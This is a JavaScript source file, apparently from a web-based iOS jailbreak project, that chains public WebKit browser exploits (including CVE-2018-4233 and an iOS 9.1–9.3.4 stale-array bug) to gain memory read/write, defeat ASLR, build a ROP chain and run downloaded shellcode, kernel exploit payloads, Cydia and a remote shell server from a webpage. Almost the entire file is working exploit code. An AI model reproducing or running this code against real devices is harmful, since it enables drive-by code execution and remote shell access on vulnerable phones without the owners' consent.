/***
 *         ██╗ █████╗ ██╗██╗     ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗    ███╗   ███╗███████╗
 *         ██║██╔══██╗██║██║     ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝    ████╗ ████║██╔════╝
 *         ██║███████║██║██║     ██████╔╝██████╔╝█████╗  ███████║█████╔╝     ██╔████╔██║█████╗
 *    ██   ██║██╔══██║██║██║     ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗     ██║╚██╔╝██║██╔══╝
 *    ╚█████╔╝██║  ██║██║███████╗██████╔╝██║  ██║███████╗██║  ██║██║  ██╗    ██║ ╚═╝ ██║███████╗
 *     ╚════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚══════╝
 *
 *    A collection of public exploits by various security researchers chained together to escallate to kernel privileges from a website, with as final payload a jailbreak including post-exploitation utillities such as the Cydia Package manager and a remote shell server.
 */

/*
     Credits:
     - Luca Todesco (Jailbreak Me with his own webkit exploit and Pangu's IOMobileFramebuffer kernel exploit)
     - Tihmstar for his 9.1 - 9.3.4 jailbreakme
     - Niklas B and Phoenhex for CVE-2018-4233 and the awesome exploit development kit and writeup
     - Ian Beer for his amazing work, writeups and full-exploits. In specific for the empty_list exploit
     - Jonathan Levin for his Jailbreak Toolkit
     - The webkit foundation for having the awesome feature of retrieving the client's GPU model through javascript
     - Apple Inc. for patching these vulnerabilities. As they are of severe impact to security of iOS devices.
 */

/*
    Contibutions:
    - Feel free to contribute to this exploit but mention all authors, they deserve that.
    - Please initialize all variables, this keeps the exploits stable
 */

//Global Initialization
counter = 0;
filestream = "LOADING";
payload_tar = "LOADING";
payload_cydia = "LOADING";
payload_launchctl = "LOADING";
payload_offsets = "LOADING";
var workbuf = new ArrayBuffer(0x1000000);
var u32_buffer = new Uint32Array(workbuf);
var u8_buffer = new Uint8Array(workbuf);
var shellcode_length = 0;
var binfile = 0;
var mem0=0;
var mem1=0;
var mem2=0;
var pressure = new Array(400);
var bufs = new Array(10000);
var fcp = 0;
var smsh = new Uint32Array(0x10);
var trycatch = "";
for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);
var TEN = 10;
var HUNDRED = 100;
var THOUSAND = 1000;
var VERBOSITY_LOW = 0;
var VERBOSITY_DEFAULT = 1;
var VERBOSITY_HIGH = 2;
var VERBOSITY_VERBOSE = 3;
var BASE32 = 0x100000000;
var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer); //QWORD
var i32 = new Uint32Array(conversion_buffer); //DWORD

/* configuration options */
verbosity = VERBOSITY_VERBOSE; //we only want most important stuff to be displayed
print = alert; //override the default print function with the alert function so we get a popup
ITERS = TEN*THOUSAND;
ALLOCS = THOUSAND;

/* common functions */

//Offset detection (Not needed for some of the exploits)
function has_offsets() {
    if(!window.chosendevice) return false;
    if(!window.chosendevice.offsets) return false;
    return true;
}

    //Hex conversion
function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`;
    return `0x${x.toString(16)}`;
}

//Float to Integer conversion
function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

//Integer to Float conversion
function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

//Exclusive OR operand on two numbers
function xor(a, b) {
    var res = 0, base = 1;
    for(var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^(b&1));
        a = (a-(a&1))/2;
        b = (b-(b&1))/2;
        base *= 2;
    }
    return res;
}

//function called for exploit failure notification
function fail(x) {
    print('FAIL ' + x);
    throw null;
}

//function for loading a binary into our app
function load_binary_resource(url) {
    var req = new XMLHttpRequest();
    req.open('GET', url, false);
    req.overrideMimeType('text\/plain; charset=x-user-defined');
    req.send(null);
    if (req.status != 200) {
        print("Failed to download required resource.");
        stop=1;
    }
    return req.responseText;
}

/***
 *     ██╗ ██╗    ██████╗                ██╗ ██╗   ██████╗    ██╗
 *    ███║███║   ██╔═████╗              ███║███║   ╚════██╗  ███║
 *    ╚██║╚██║   ██║██╔██║    █████╗    ╚██║╚██║    █████╔╝  ╚██║
 *     ██║ ██║   ████╔╝██║    ╚════╝     ██║ ██║    ╚═══██╗   ██║
 *     ██║ ██║██╗╚██████╔╝               ██║ ██║██╗██████╔╝██╗██║
 *     ╚═╝ ╚═╝╚═╝ ╚═════╝                ╚═╝ ╚═╝╚═╝╚═════╝ ╚═╝╚═╝
 *
 */

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
        var o = [13.37];
        var Constructor${counter} = function(o) { ${constr} };
        var hack = false;
        var Wrapper = new Proxy(Constructor${counter}, {
            get: function() {
                if (hack) {
                    ${modify}
                }
            }
        });
        for (var i = 0; i < ITERS; ++i)
            new Wrapper(o)
        hack = true
        var bar = new Wrapper(o)
        ${res}
    `);
}

var pwn = function() {
    var _off = window.chosendevice.offsets;
    console.log('Starting stage 1...');
    alert('Stage 1 started!');
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
        },
        
        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr));
        },
        
        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            if (x.a != 0x1337) {
                fail(1); //failed as we seem not to be vulnerable
            }
        }
    };
    
    stage1.test(); //sanity check to see if the vulnerability really exists
    
    //Spray the heap with structures
    var structure_spray = [];
    for (var i = 0; i < 1000; ++i) {
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
        ary['prop'+i] = 1;
        structure_spray.push(ary);
    }
    
    //Leak the address of an aligned structure
    var manager = structure_spray[500];
    var leak_addr = stage1.addrof(manager); //Trigger the infoleak, we can read the address of any structure!
    
    if(verbosity >= VERBOSITY_HIGH) print('leaking from '+hex(leak_addr));
    
    //function for allocating above
    function alloc_above_manager(expr) {
        var res = null;
        
        //Keep looking for an address that is above the leaked address
        while(stage1.addrof(res) < leak_addr) {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr));
            }
            res = eval(expr)
        }
        
        return res
    }
    
    var unboxed_size = 100;
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']'); //array with double
    var boxed = alloc_above_manager('[{}]'); //array with object
    var victim = alloc_above_manager('[]'); //array
    
    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337; //first padding
    
    //set up r/w access to the victim
    function victim_write(val) {
        victim.p0 = val;
    }
    
    function victim_read() {
        return victim.p0;
    }
    
    i32[0] = 0x200                // Structure ID
    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
    var outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        p3: 0xfffffff, // Butterfly indexing mask
    };
    
    var fake_addr = stage1.addrof(outer) + 0x20
    
    if(verbosity >= VERBOSITY_DEFAULT) print('fake object is at ' + hex(fake_addr));
    
    //leak the addresses of our cell
    var unboxed_addr = stage1.addrof(unboxed);
    var boxed_addr = stage1.addrof(boxed);
    var victim_addr = stage1.addrof(victim);
    
    if(verbosity >= VERBOSITY_HIGH) print('leak ' + hex(leak_addr)
                                          + '\nunboxed ' + hex(unboxed_addr)
                                          + '\nboxed ' + hex(boxed_addr)
                                          + '\nvictim ' + hex(victim_addr));
    
    var holder = {fake: {}};
    holder.fake = stage1.fakeobj(fake_addr); //now we have a fake object with control over it yay!
    
    // From here on GC would be uncool
    
    // Share a butterfly for easier boxing/unboxing
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
    
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);
    
    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
    
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10);
    }
    
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
    }
    
    console.log('stage 1 complete, moving to stage 2.');
    
    //Alright, this is where we get full r/w to memory
    var stage2 = {
        addrof: function(victim) {
            boxed[0] = victim
            return f2i(unboxed[0])
        },
        
        fakeobj: function(addr) {
            unboxed[0] = i2f(addr);
            return boxed[0];
        },
        
        write64: function(where, what) {
            set_victim_addr(where);
            victim_write(this.fakeobj(what));
            reset_victim_addr();
        },
        
        read64: function(where) {
            set_victim_addr(where);
            var res = this.addrof(victim_read());
            reset_victim_addr();
            return res;
        },
        
        write_non_zero: function(where, values) {
            for (var i = 0; i < values.length; ++i) {
                if (values[i] != 0)
                    this.write64(where + i*8, values[i]);
            }
        },
        
        test: function() {
            this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
            if (0xfff != this.read64(boxed_addr + 0x10)) {
                fail(2)
            }
        },
        
        forge: function(values) {
            for (var i = 0; i < values.length; ++i)
                unboxed[1 + i] = i2f(values[i]);
            return shared_butterfly + 8;
        },
        
        clear: function() {
            outer = null
            holder.fake = null
            for (var i = 0; i < unboxed_size; ++i)
                boxed[0] = null;
        }
    };
    
    var wrapper = document.createElement('div');
    var wrapper_addr = stage2.addrof(wrapper);
    var el_addr = stage2.read64(wrapper_addr + _off.padding);
    var vtab_addr = stage2.read64(el_addr);
    
    //now get the ASLR slide
    var slide = stage2.read64(vtab_addr) - _off.vtable;
    var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
    var callbacks = _off.callbacks + slide;
    var g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
    var g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
    var longjmp = _off.longjmp + slide;
    var dlsym = _off.dlsym + slide;
    var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide)
    var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide)
    var jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide)
    var useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide)
    var ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
    var pop_x8 = _off.modelio_popx8;
    var pop_x2 = _off.coreaudio_popx2;
    var linkcode_gadget = _off.linkcode_gadget;
    
    if(verbosity >= VERBOSITY_HIGH) {
        print('disablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
              + '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
              + '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
              + '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
              + '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
              + '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
              + '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy));
    }

    //JIT Hardening stuff
    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
        // Probably an older phone, should be even easier
        fail(3);
    }
    
    //Now set up our shellcode for code execution
    var callback_vector = stage2.read64(callbacks);

    var poison = stage2.read64(g_typedArrayPoisons + 6*8);
    var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);

    var shellcode_src = buffer_addr + 0x4000;
    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
    stage2.write64(shellcode_src + 4, dlsym);
              
    //set up our fake executable stack
    var fake_stack = [
        0,
        shellcode_length,  // x2
        0,
        
        pop_x8,
        
        0, 0, 0, 0, 0,
        shellcode_dst, // x8
        0, 0, 0, 0,
        stage2.read64(ptr_stack_check_guard) + 0x58,
        
        linkcode_gadget,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        
        shellcode_dst
    ];
              
    // Set up fake vtable at offset 0
    u32_buffer[0] = longjmp % BASE32;
    u32_buffer[1] = longjmp / BASE32;

    // Set up fake stack at offset 0x2000
    for (var i = 0; i < fake_stack.length; ++i) {
          u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
          u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
    }
    
    //lets set up our code exection of the dylib payload
    stage2.write_non_zero(el_addr, [
        buffer_addr, // fake vtable
        0,
        shellcode_src, // x21
        0, 0, 0, 0, 0, 0, 0,
        0, // fp

        pop_x2, // lr
        0,
        buffer_addr + 0x2000, // sp
    ]);
    print('shellcode is at ' + hex(shellcode_dst));
    print('For best results close all apps except for safari before dismissing the next alert!');
    wrapper.addEventListener('click', function(){}); //execute the shellcode
};

              
var wk113go = function() {
    
    //we really need offsets first
    if(!has_offsets) return fail(-1);
    
    //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
    fetch('payloads/11_3_1/emptylist.bin').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try{
                shellcode_length = buffer.byteLength; //Get the length of the shellcode array
                
                //check whether our shellcode exceeds our executable region size that will be set up later
                if(shellcode_length > 0x1000000) {
                    //shellcode is too big
                    fail(5);
                }
                                
                u8_buffer.set(new Uint8Array(buffer), 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
                print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                pwn();
            } catch(exception) {
                document.write(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
            }
        });
    });
    
};

/***
 *     █████╗    ██╗               █████╗    ██████╗ ██╗  ██╗    ██████╗ ██████╗       ██████╗ ██╗████████╗
 *    ██╔══██╗  ███║              ██╔══██╗   ╚════██╗██║  ██║    ╚════██╗╚════██╗      ██╔══██╗██║╚══██╔══╝
 *    ╚██████║  ╚██║    █████╗    ╚██████║    █████╔╝███████║     █████╔╝ █████╔╝█████╗██████╔╝██║   ██║
 *     ╚═══██║   ██║    ╚════╝     ╚═══██║    ╚═══██╗╚════██║     ╚═══██╗██╔═══╝ ╚════╝██╔══██╗██║   ██║
 *     █████╔╝██╗██║               █████╔╝██╗██████╔╝██╗  ██║    ██████╔╝███████╗      ██████╔╝██║   ██║
 *     ╚════╝ ╚═╝╚═╝               ╚════╝ ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚══════╝      ╚═════╝ ╚═╝   ╚═╝
 *
 *      By Tihmstar
 */
  
  function getArrFromResource(res){
      while (res.length % 4){
          res += "A";
      }
      var ret = new Uint32Array(res.length/4);
      for(var i = 0; i < res.length; i+=4){
          var word = (res.charCodeAt(i) & 0xff) | ((res.charCodeAt(i+1) & 0xff) << 8)  | ((res.charCodeAt(i+2) & 0xff) << 16)  | ((res.charCodeAt(i+3) & 0xff) << 24);
          ret[i/4] = word;
      }
      return ret;
  }
  
  function swag() {
      if(bufs[0]) return;
              
      dgc(); //trigger garbage collector
              
      for (i=0; i < bufs.length; i++) {
          bufs[i] = new Uint32Array(0x100*2)
        
          for (k=0; k < bufs[i].length; ) {
              bufs[i][k++] = 0x41414141;
              bufs[i][k++] = 0xffff0000;
          }
      }
      console.log("doneswag");
    }

    function smashed(stale,tar_ptr,cydia_ptr,launchctl_ptr,offsets_ptr) {
        console.log("smsh len="+smsh.length);
        console.log("fcp=0x"+fcp.toString(16));
        console.log("binfile=0x"+binfile.toString(16));
      
        // getJIT
        r2 = smsh[(fcp+0x14)/4];
        r3 = smsh[(r2+0x10)/4];
        shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
              
        console.log("r2=0x"+r2.toString(16));
        console.log("r3=0x"+r3.toString(16));
        console.log("shellcode=0x"+shellcode.toString(16));
        console.log("Plant payload3="+offsets_ptr.toString(16));
              
        smsh[shellcode/4] = offsets_ptr;
        shellcode += 4;
              
        console.log("Plant payload2="+launchctl_ptr.toString(16));
        smsh[shellcode/4] = launchctl_ptr;
        shellcode += 4;
              
        console.log("Plant payload1="+cydia_ptr.toString(16));
        smsh[shellcode/4] = cydia_ptr;
        shellcode += 4;
              
        console.log("Plant payload0="+tar_ptr.toString(16));
        smsh[shellcode/4] = tar_ptr;
        shellcode += 4;
              
        for(var i = 0; i < filestream.length; i+=4) {
            var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
            smsh[(shellcode+i)/4] = word;
        }
              
        smsh[(fcp+0x00)/4] = fcp+4;
        smsh[(fcp+0x04)/4] = fcp+4;
        smsh[(fcp+0x08)/4] = shellcode+1; //PC
        smsh[(fcp+0x30)/4] = fcp+0x30+4-0x18-0x34+0x8;
              
        console.log("Do fc() smashed");
        fc();
        console.log("end smashed");
    }
    
    //Bit lazy but should work
    function sleep(delay) {
        var start = new Date().getTime();
        while (new Date().getTime() < start + delay);
    }

    dgc = function() {
        console.log("dgc start");
        for (var i = 0; i < pressure.length; i++) {
            pressure[i] = new Uint32Array(0xa000);
        }
        // sleep(1000);
        console.log("dgc done");
    };
    
    dgcf = function() {
        console.log("dgcf start");
        for (var i = 0; i < pressure.length; i++) {
            pressure[i] = 0
        }
        console.log("dgcf done");
    };
              
    function wk91sploit(){
        console.log("going");
        document.write("Running stage 1 exploit");
        setTimeout(go_, 100);
    }
              
    function swag() {
              
        if(bufs[0]) return;
        dgc();
              
        for (i=0; i < bufs.length; i++) {
            bufs[i] = new Uint32Array(0x100*2)
            for (k=0; k < bufs[i].length; ){
                bufs[i][k++] = 0x41414141;
                bufs[i][k++] = 0xffff0000;
            }
        }
    }
              
    function u2d(low, hi) {
        if (!_dview) _dview = new DataView(new ArrayBuffer(16));
        
        _dview.setUint32(0, hi);
        _dview.setUint32(4, low);
        return _dview.getFloat64(0);
    }
              
    function d2u(f) {
        if (!_dview) _dview = new DataView(new ArrayBuffer(16));
        _dview.setFloat64(0,f);
        return _dview.getUint32(0);
    }
              
    function go_(){
        var arr = new Array(2047);
        var not_number = {};
        not_number.toString = function() {
            arr = null;
            props["stale"]["value"] = null;
            swag();
            return 10;
        };
              
        smsh[0] = 0x21212121;
        smsh[1] = 0x31313131;
        smsh[2] = 0x41414141;
        smsh[3] = 0x51515151;
        smsh[4] = 0x61616161;
        smsh[5] = 0x71717171;
        smsh[6] = 0x81818181;
        smsh[7] = 0x91919191;
              
        var props = {
            p0 : { value : 0 },
            p1 : { value : 1 },
            p2 : { value : 2 },
            p3 : { value : 3 },
            p4 : { value : 4 },
            p5 : { value : 5 },
            p6 : { value : 6 },
            p7 : { value : 7 },
            p8 : { value : 8 },
            length : { value : not_number },
            stale : { value : arr },
            after : { value : 666 }
        };
              
        var target = [];
        var stale = 0;
        var before_len = arr.length;
        console.log("before="+before_len);
        Object.defineProperties(target, props);
        stale = target.stale;
        console.log("after="+stale.length);

        if (stale.length != 0x41414141){
            alert("exploit failed");
            location.reload();
            return;
        }
              
        var obuf = new Uint32Array(2);
        obuf[0] = 0x41414141;
        obuf[1] = 0xffff0000;

        stale[0] = 0x12345678;
        stale[1] = {};
              
        for(var z=0; z<0x100; z++) fc();
              
        console.log("pre array");
        for (i=0; i < bufs.length; i++) {
            var dobreak = 0;
            for (k=0; k < bufs[0].length; k++){
                if(bufs[i][k] != obuf[k%2]){
                    console.log("bufs[i][k]  =0x"+bufs[i][k].toString(16));
                    console.log("bufs[i][k+1]=0x"+bufs[i][k+1].toString(16));

                    stale[0] = fc;
                    fcp = bufs[i][k];

                    stale[0] = filestream;
                    binfile = bufs[i][k];

                    stale[0] = payload_tar;
                    var payload_tar_ptr = bufs[i][k];

                    stale[0] = payload_cydia;
                    var payload_cydia_ptr = bufs[i][k];

                    stale[0] = payload_launchctl;
                    var payload_launchctl_ptr = bufs[i][k];

                    stale[0] = payload_offsets;
                    var payload_offsets_ptr = bufs[i][k];

                    stale[0] = smsh;
                    var ptrsmsh = bufs[i][k];

                    stale[2] = {'a':u2d(0x2,0x10),'b':smsh, 'c':u2d(0,0), 'd':u2d(0,0)}
                    stale[0] = {'a':u2d(0,0x00e00600),'b':u2d(1,0x10), 'c':u2d(bufs[i][k+2*2]+0x10,0), 'd':u2d(0,0)}
                    stale[1] = stale[0];
                    bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
                    var leak = stale[0][0].charCodeAt(0);
                    leak += stale[0][1].charCodeAt(0) << 8;
                    leak += stale[0][2].charCodeAt(0) << 16;
                    leak += stale[0][3].charCodeAt(0) << 24;
                    console.log("leakptr=0x"+leak.toString(16));
                    bufs[i][k] -= 0x10;
                    stale[0] = {'a':u2d(leak,0x00602300), 'b':u2d(0,0), 'c':smsh, 'd':u2d(0,0)}
                    stale[1] = stale[0];
                    bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
                    stale[0][4] = 0;
                    stale[0][5] = 0xffffffff;
                    bufs[i][k] -= 0x10;

                    mem0 = stale[0];
                    mem2 = smsh;
                    if (smsh.length != 0x10) {
                        document.write("Running stage 2 exploit");
                        setTimeout(function () {
                             smashed(stale,payload_tar_ptr,payload_cydia_ptr,payload_launchctl_ptr,payload_offsets_ptr);
                         }, 100);
                    }
                    dobreak = 1;
                    break;
                }
            }
            if (dobreak) break;
        }
      console.log("end");
    }
    
    function wk91go(){
        console.log("Downloading resources"); document.write("Downloading Resources");
        setTimeout(function () {

            //Start downloading all of the resources.
            filestream = load_binary_resource("payloads/91_934_32/stage1.bin")
            payload_tar = getArrFromResource(load_binary_resource("payloads/91_934_32/tar"))
            payload_launchctl = getArrFromResource(load_binary_resource("payloads/91_934_32/launchctl"))
            payload_offsets = getArrFromResource(load_binary_resource("payloads/91_934_32/offsets.json"))
            
            console.log("Downloading Cydia"); document.write("Downloading Cydia");
            
            setTimeout(function () {
                payload_cydia = getArrFromResource(load_binary_resource("payloads/91_934_32/Cydia.tar"))
                wk91sploit();
            }, 100);
        }, 100);
    }


/***
 *     █████╗    ██████╗    ██╗  ██╗     ██████╗ ██╗  ██╗      ██████╗ ██╗████████╗
 *    ██╔══██╗   ╚════██╗   ╚██╗██╔╝    ██╔════╝ ██║  ██║      ██╔══██╗██║╚══██╔══╝
 *    ╚██████║    █████╔╝    ╚███╔╝     ███████╗ ███████║█████╗██████╔╝██║   ██║
 *     ╚═══██║    ╚═══██╗    ██╔██╗     ██╔═══██╗╚════██║╚════╝██╔══██╗██║   ██║
 *     █████╔╝██╗██████╔╝██╗██╔╝ ██╗    ╚██████╔╝     ██║      ██████╔╝██║   ██║
 *     ╚════╝ ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝     ╚═════╝      ╚═╝      ╚═════╝ ╚═╝   ╚═╝
 *
 */

// ETA S0n
